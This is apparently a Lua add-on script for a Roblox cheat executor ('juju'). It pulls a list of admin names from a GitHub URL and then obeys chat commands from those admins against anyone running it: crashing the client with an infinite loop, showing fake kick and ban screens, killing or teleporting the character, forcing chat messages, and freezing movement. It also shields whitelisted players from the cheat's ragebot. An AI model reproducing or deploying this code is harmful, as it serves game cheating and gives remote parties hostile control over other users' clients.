local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local ChatService = game:GetService("Chat")

local my_plr = Players.LocalPlayer
local admin_list_url = "https://raw.githubusercontent.com/nigmaBoy/juju/refs/heads/main/juju"

local admin_list = {}
local whitelist = {}
local freeze_loop_conn = nil

local function fetch_admins()
    local success, result = pcall(function() return game:HttpGet(admin_list_url) end)
    if success and result then
        local content = result:match('whitelisted%s*=%s*"(.-)"')
        if content then
            admin_list = {}
            for name in string.gmatch(content, "([^,]+)") do
                local cleaned_name = name:match("^%s*(.-)%s*$")
                if cleaned_name and cleaned_name ~= "" then
                    table.insert(admin_list, cleaned_name:lower())
                end
            end
        end
    end
end

local function is_admin(player)
    if not player then return false end
    for _, admin_name in ipairs(admin_list) do
        if player.Name:lower() == admin_name then
            return true
        end
    end
    return false
end

local function find_player_by_partial(str)
    if not str then return nil end
    local s_lower = str:lower()
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name:lower():find(s_lower, 1, true) or p.DisplayName:lower():find(s_lower, 1, true) then
            return p
        end
    end
    return nil
end

local function show_fake_kick_and_execute(message, command_type)
    pcall(function()
        local kickGui = Instance.new("ScreenGui")
        kickGui.IgnoreGuiInset = true
        kickGui.ResetOnSpawn = false
        
        local background = Instance.new("Frame")
        background.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
        background.Size = UDim2.new(1, 0, 1, 0)
        background.Parent = kickGui
        
        local textLabel = Instance.new("TextLabel")
        textLabel.Size = UDim2.new(0.8, 0, 0.5, 0)
        textLabel.Position = UDim2.new(0.1, 0, 0.25, 0)
        textLabel.BackgroundColor3 = Color3.new(1, 1, 1)
        textLabel.BackgroundTransparency = 1
        textLabel.Font = Enum.Font.SourceSansBold
        textLabel.TextColor3 = Color3.new(1, 1, 1)
        textLabel.TextScaled = true
        textLabel.Text = message
        textLabel.Parent = background
        
        kickGui.Parent = my_plr:WaitForChild("PlayerGui")
        
        task.wait(0.2)
        
        if command_type == "rejoin" then
            local success, _ = pcall(rejoin) -- Try common executor function first
            if not success then
                my_plr:Kick() -- Fallback to standard kick
            end
        elseif command_type == "shop" then
            local success, _ = pcall(serverhop) -- Try common executor function first
            if not success then
                TeleportService:Teleport(game.PlaceId, my_plr) -- Fallback to TeleportService
            end
        end
    end)
end

-- Handles custom message and custom delay before kicking (Used by !ban)
local function show_custom_kick(message, delay_time)
    pcall(function()
        local kickGui = Instance.new("ScreenGui")
        kickGui.IgnoreGuiInset = true
        kickGui.ResetOnSpawn = false
        
        local background = Instance.new("Frame")
        background.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
        background.Size = UDim2.new(1, 0, 1, 0)
        background.Parent = kickGui
        
        local textLabel = Instance.new("TextLabel")
        textLabel.Size = UDim2.new(0.8, 0, 0.5, 0)
        textLabel.Position = UDim2.new(0.1, 0, 0.25, 0)
        textLabel.BackgroundColor3 = Color3.new(1, 1, 1)
        textLabel.BackgroundTransparency = 1
        textLabel.Font = Enum.Font.SourceSansBold
        textLabel.TextColor3 = Color3.new(1, 1, 1)
        textLabel.TextScaled = true
        textLabel.Text = message
        textLabel.Parent = background
        
        kickGui.Parent = my_plr:WaitForChild("PlayerGui")
        
        task.wait(delay_time) -- Waits for the specified delay (5 seconds for !ban)
        
        my_plr:Kick()
    end)
end


RunService.Heartbeat:Connect(function()
    pcall(function()
        local get_target = juju["get_active_ragebot_target"]
        local set_target = juju["set_active_ragebot_target"]
        
        if get_target and set_target then
            local current_target = get_target()
            if current_target and whitelist[current_target.Name] then
                set_target(nil)
            end
        end
    end)
end)


local function on_any_player_chatted(speaker, message)
    if not is_admin(speaker) or not message:find("!") then
        return
    end

    local args = message:split(" ")
    local cmd_full = args[1]
    local target_str = args[2]
    local cmd = cmd_full:gsub("!", "")
    local target_player = find_player_by_partial(target_str)

    if cmd == "wl" or cmd == "unwl" then
        if target_player then
            whitelist[target_player.Name] = (cmd == "wl")
        end
        return
    end

    if target_player and target_player == my_plr then
        if cmd == "say" then
            local message_to_say = table.concat(args, " ", 3)
            pcall(function()
                ChatService:Chat(my_plr.Character.Head, message_to_say, Enum.ChatColor.White)
            end)

        elseif cmd == "setfps" then
            local fps_num = tonumber(args[3])
            if fps_num then
                pcall(setfpscap, fps_num)
            end

        elseif cmd == "rejoin" then
            show_fake_kick_and_execute("You have been commanded to rejoin.", "rejoin")

        elseif cmd == "shop" then
            show_fake_kick_and_execute("You have been commanded to server hop.", "shop")

        elseif cmd == "kick" then
            my_plr:Kick()

        elseif cmd == "ban" then
            -- This is the command that waits 5 seconds and kicks with the ban message
            show_custom_kick("You have been banned.", 5)

        elseif cmd == "crash" then
            while true do end

        elseif cmd == "reset" then
            if my_plr.Character and my_plr.Character:FindFirstChildOfClass("Humanoid") then
                my_plr.Character.Humanoid.Health = 0
            end

        elseif cmd == "bring" then
            if my_plr.Character and my_plr.Character.PrimaryPart and speaker.Character and speaker.Character.PrimaryPart then
                my_plr.Character:SetPrimaryPartCFrame(speaker.Character.PrimaryPart.CFrame)
            end
            
        elseif cmd == "thaw" then
            if freeze_loop_conn then freeze_loop_conn:Disconnect() end
            
            freeze_loop_conn = RunService.Heartbeat:Connect(function()
                local my_char = my_plr.Character
                local admin_char = speaker.Character
                if not (my_char and my_char.PrimaryPart and admin_char and admin_char.PrimaryPart) then
                    freeze_loop_conn:Disconnect()
                    freeze_loop_conn = nil
                    return
                end
                
                my_char:SetPrimaryPartCFrame(admin_char.PrimaryPart.CFrame * CFrame.new(0, 0, -5))
                
                local hum = my_char:FindFirstChildOfClass("Humanoid")
                if hum then
                    hum:SetStateEnabled(Enum.HumanoidStateType.Running, false)
                    hum:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
                end
            end)
        
        elseif cmd == "unthaw" then
            if freeze_loop_conn then
                freeze_loop_conn:Disconnect()
                freeze_loop_conn = nil
            end
            
            if my_plr.Character and my_plr.Character:FindFirstChildOfClass("Humanoid") then
                local hum = my_plr.Character.Humanoid
                hum.PlatformStand = false
                hum:SetStateEnabled(Enum.HumanoidStateType.Running, true)
                hum:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
            end
        end
    end
end

fetch_admins()

for _, player in ipairs(Players:GetPlayers()) do
    player.Chatted:Connect(function(message)
        on_any_player_chatted(player, message)
    end)
end

Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(message)
        on_any_player_chatted(player, message)
    end)
end)
